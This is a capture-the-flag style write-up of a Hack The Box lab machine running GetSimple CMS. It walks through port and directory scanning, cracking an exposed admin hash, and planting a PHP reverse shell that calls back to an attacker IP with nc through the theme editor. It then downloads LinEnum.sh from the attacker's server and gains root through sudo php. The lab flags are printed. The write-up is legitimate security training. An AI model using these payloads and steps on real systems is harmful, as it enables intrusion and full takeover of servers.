# Knowledge Check Walktrough
Write up of the Getting Started HTB modules
## Scanning the target
Enumeration/Scanning with `Nmap` - perform a quick scan for open ports followed by a full port scan:

    nmap -sV -sC -p- 10.129.176.153

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
    |   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
    |_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    | http-robots.txt: 1 disallowed entry
    |_/admin/
    |_http-title: Welcome to GetSimple! - gettingstarted
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Analysing the web server:

    whatweb 10.129.176.153
    http://10.129.176.153 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.176.153], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]

Directory fuzzing:

    ffuf -w directory-list-2.3-small.txt:FUZZ -u http://10.129.176.153:80/FUZZ

http://10.129.176.153/data/
http://10.129.176.153/backups/
http://10.129.176.153/theme/
http://10.129.176.153/plugins/
http://10.129.176.153/admin/

so this web site is working with a cms called "get simple"
lest try to investigate the version of this cms because there is a lot of exploit but we need to find the version

    http://10.129.26.161/data/cache/2a4c6447379fba09620ba05582eb61af.txt
    {"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}

we found the version here.
lest find exploit related:

     searchsploit getsimple CMS 3.3.15
No result 
but for the latest version there is an exploit :

    GetSimple CMS v3.3.16 - Remote Code Execution (RCE)                                   | php/webapps/51475.py

when we analyse the python code of the exploit, we see this exploit is working for the 3.3.15 versions

```
if version <= "3.3.16":
	print( red + f"[+] the version {version} is vulnrable to CVE-2022-41544")
```

in data/users/admin.xml there is:

    <item><USR>admin</USR><NAME/><PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD><EMAIL>admin@gettingstarted.com</EMAIL><HTMLEDITOR>1</HTMLEDITOR><TIMEZONE/><LANG>en_US</LANG>

username = admin
the password seems encrypted in sha1
d033e22ae348aeb5660fc2140aec35850c4da997 
decrypted = admin

we try to connect and we got access to the admin pannel.


there is an api key here:

http://10.129.26.161/data/other/authorization.xml

    <item><apikey><![CDATA[4f399dc72ff8e619e327800f851e9986]]></apikey></item>

usefull if we use the exploit or we cant decrypt the password but for the moment we continue manualy

in the theme editor menue we can edit php theme files 
http://10.129.26.161/admin/theme-edit.php
so we can inject a reverse shell php code like this:

    <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.176 9443 >/tmp/f"); ?>

and click on save 

start an netcat listener on port 9443

    nc -lvnp 9443
    listening on [any] 9443 ...

activate the reverse shell code 

     curl http://10.129.26.161:80/theme/Innovation/template.php

connected:

    connect to [10.10.14.176] from (UNKNOWN) [10.129.26.161] 42302
    /bin/sh: 0: can't access tty; job control turned off
    $
    $ cd home
    $ ls
    mrb3n
    $ cd mrb3n
    $ ls
    user.txt
    $ cat user.txt
    7002d65b149b0a4d19132a66feed21d8


## Privelege escalation 
We need the root flag 

transfer LinEnum.sh on the target machine with python http server:

    sudo python3 -m http.server 8080

download file on the target machine:

    
    wget http://10.10.14.176:8080/LinEnum.sh
    chmod +x ./LinEnum.sh
    ./LinEnum.sh
 

LinEnum.sh Result:

    [+] Possible sudo pwnage! /usr/bin/php

https://gtfobins.github.io/ 
GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

We are allowed to lunch php with sudo right so i start a shell using php and sudo right to be root:

    CMD="/bin/sh"
    sudo php -r "system('$CMD');"
    whoami
    root
    cd /root
    ls
    root.txt
    snap
    cat root.txt
    f1fba6e9f71efb2630e6e34da6387842

We found all the flag it's the end.
Thanks for reading
Have a great day, never stop learning. 
